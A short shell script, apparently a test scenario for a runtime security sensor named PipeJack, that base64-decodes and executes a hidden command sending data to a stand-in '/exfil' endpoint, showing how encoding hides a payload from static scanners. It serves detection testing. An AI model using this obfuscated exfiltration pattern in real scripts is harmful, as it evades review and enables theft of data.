#!/bin/sh
# Scenario 4 — base64-obfuscated shell
# The real payload is base64-encoded. A static scanner that reads the
# source sees only "echo ... | base64 -d | sh" and cannot determine what
# runs. PipeJack's runtime sensor sees the actual decoded binaries.

B64_PAYLOAD=$(echo 'Y3VybCAtbSA1IGh0dHA6Ly8xMC4yNTUuMjU1LjEvZXhmaWwgLWQgc3RvbGVu' | base64 -d)
# decoded: curl -m 5 http://10.255.255.1/exfil -d stolen

echo "[attack] decoding and executing hidden payload"
sh -c "$B64_PAYLOAD" || true
echo "[attack] done"
